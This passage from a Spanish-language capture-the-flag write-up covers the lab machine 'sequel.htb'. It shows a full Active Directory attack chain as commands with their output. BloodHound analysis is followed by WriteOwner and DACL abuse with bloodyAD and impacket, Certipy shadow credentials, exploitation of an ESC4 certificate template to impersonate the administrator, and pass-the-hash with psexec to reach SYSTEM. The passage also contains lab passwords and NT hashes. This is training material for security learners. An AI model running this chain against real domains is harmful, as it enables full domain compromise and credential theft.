20250507132050_computers.json   20250507132050_groups.json
20250507132050_containers.json  20250507132050_ous.json
20250507132050_domains.json     20250507132050_users.json
20250507132050_gpos.json  
```

Los vamos a comprimir en un zip para importarlo en Bloodhound con el siguiente comando:

```bash
zip bloodhound_data.zip 20*.json
```

Después con Bloodhound abrimos los archivos que nos encontramos. Puedes ver los pasos de instalación de BloodHound CE en la siguiente sección:

{% content-ref url="/pages/TEIs7wP6Kqu4uwenlqgM" %}
[BloodHound](/ethical-hacking-cheatsheet/active-directory/active-directory/bloodhound.md)
{% endcontent-ref %}

Encontramos varias cosas interesantes. Ya enumeramos anteriormente los usuarios del sistema:

<figure><img src="/files/WsnZMEeEiViS7zEWRDVa" alt=""><figcaption></figcaption></figure>

Destacan los usuarios:

* `CA_SVC`
* `SQL_SVC` (tenemos contraseña)

El usuario `Ryan` tiene permiso **`WriteOwner`** en **`CA_SVC`** y **`CA_SVC`** es el emisor del certificado. Entonces podemos configurar el propietario de **`CA_SVC` como Ryan.**

<figure><img src="/files/WD01u3qH42n0BNsnL47T" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/CqnRI6vPvRhuyCl0hFDd" alt=""><figcaption></figcaption></figure>

### Modificar propietario

Para ello vamos a usar BloodyAD para modificar el propietario de un certificado en el sistema a través de un comando específico, otorgando a '`ryan`' control sobre '`ca_svc`'.

```shell-session
afsh4ck@kali$ bloodyAD --host '10.10.11.51' -d 'sequel.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan' 

[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
```

### Obtener derechos de control

Luego, se utiliza Impacket para modificar los derechos de acceso DACLS, proporcionándole a 'ryan' control completo sobre el objetivo.

```shell-session
afsh4ck@kali$ impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250121-151851.bak
[*] DACL modified successfully!
```

### Obtener Shadow Credentials

Finalmente, Certipy se emplea para generar un certificado y un Key Credential, lo que permite autenticarse como '`ca_svc`' y extraer el NT hash:

```shell-session
afsh4ck@kali$ certipy-ad shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd413c5e7-b6d0-b905-5811-d8a830363f65'
[*] Adding Key Credential with device ID 'd413c5e7-b6d0-b905-5811-d8a830363f65' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'd413c5e7-b6d0-b905-5811-d8a830363f65' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

Tenemos el hash de `CA_SVC`! Vamos a enumerar vulnerabilidades en el host usando el hash.

#### ntpdate

```shell-session
afsh4ck@kali$ sudo ntpdate sequel.htb
2025-05-07 15:28:03.013486 (+0200) -0.220061 +/- 0.024190 sequel.htb 10.10.11.51 s1 no-leap
```

#### Buscar Templates vulnerables

```bash
certipy-ad find -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Saved BloodHound data to '20250507144315_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250507144315_Certipy.txt'
[*] Saved JSON output to '20250507144315_Certipy.json'
```

Ahora que sabemos qué templates hay en la CA, el siguiente paso es encontrar **uno que sea vulnerable y no requiera un Subject Alternative Name (SAN)** como `DunderMifflinAuthentication`

```bash
certipy-ad template -template DunderMifflinAuthentication \
-u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

#### Buscar vulnerabilidades

```bash
certipy-ad find -vulnerable -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Saved BloodHound data to '20250507144757_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250507144757_Certipy.txt'
[*] Saved JSON output to '20250507144757_Certipy.json'
```

Eso nos ha generado un archivo `20250507144757_Certipy.txt`. Vamos a echarle un ojo:

```
    Enrollment Flag                     : AutoEnrollment
  36   │                                           PublishToDs
  37   │     Private Key Flag                    : 16842752
  38   │     Extended Key Usage                  : Client Authentication
  39   │                                           Server Authentication
  40   │     Requires Manager Approval           : False
  41   │     Requires Key Archival               : False
  42   │     Authorized Signatures Required      : 0
  43   │     Validity Period                     : 1000 years
  44   │     Renewal Period                      : 6 weeks
  45   │     Minimum RSA Key Length              : 2048
  46   │     Permissions
  47   │       Enrollment Permissions
  48   │         Enrollment Rights               : SEQUEL.HTB\Domain Admins
  49   │                                           SEQUEL.HTB\Enterprise Admins
  50   │       Object Control Permissions
  51   │         Owner                           : SEQUEL.HTB\Enterprise Admins
  52   │         Full Control Principals         : SEQUEL.HTB\Cert Publishers
  53   │         Write Owner Principals          : SEQUEL.HTB\Domain Admins
  54   │                                           SEQUEL.HTB\Enterprise Admins
  55   │                                           SEQUEL.HTB\Administrator
  56   │                                           SEQUEL.HTB\Cert Publishers
  57   │         Write Dacl Principals           : SEQUEL.HTB\Domain Admins
  58   │                                           SEQUEL.HTB\Enterprise Admins
  59   │                                           SEQUEL.HTB\Administrator
  60   │                                           SEQUEL.HTB\Cert Publishers
  61   │         Write Property Principals       : SEQUEL.HTB\Domain Admins
  62   │                                           SEQUEL.HTB\Enterprise Admins
  63   │                                           SEQUEL.HTB\Administrator
  64   │                                           SEQUEL.HTB\Cert Publishers
  65   │     [!] Vulnerabilities
  66   │       ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

El archivo muestra que **el template analizado es vulnerable a ESC4**, y el grupo `SEQUEL.HTB\Cert Publishers` tiene **permisos peligrosos (Full Control)** sobre él.

### Solicitud de ticket kerberos de administrator

{% code overflow="wrap" %}

```bash
sudo certipy-ad req -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns sequel.htb -debug

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'sequel.htb' at '10.10.11.51'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 28
[*] Got certificate with multiple identifications
    UPN: 'administrator@sequel.htb'
    DNS Host Name: 'sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_sequel.pfx'
```

{% endcode %}

Eso nos crea el certificado `administrator_sequel.pfx` que usaremos para volcar el hash.

### Obtener hash de admin con el certificado

```shell-session
afsh4ck@kali$ certipy-ad auth -pfx administrator_sequel.pfx  -domain sequel.htb

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@sequel.htb'
    [1] DNS Host Name: 'sequel.htb'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

### Acceso como SYSTEM

```shell-session
afsh4ck@kali$ impacket-psexec -hashes :7a8d4e04986afa8ed4060f75e5a0b3ff sequel.htb/administrator@10.10.11.51

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.51.....
[-] share 'Accounting Department' is not writable.
[*] Found writable share ADMIN$
[*] Uploading file iSBUNKCW.exe
[*] Opening SVCManager on 10.10.11.51.....
[*] Creating service RgiK on 10.10.11.51.....
[*] Starting service RgiK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6640]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

```powershell
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 3705-289D

 Directory of C:\Users\Administrator\Desktop

01/04/2025  08:58 AM    <DIR>          .
01/04/2025  08:58 AM    <DIR>          ..
05/07/2025  05:06 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,795,066,880 bytes free

C:\Users\Administrator\Desktop> type root.txt
5222e996dc86508f9b5b0************
```

Y conseguimos la root flag!
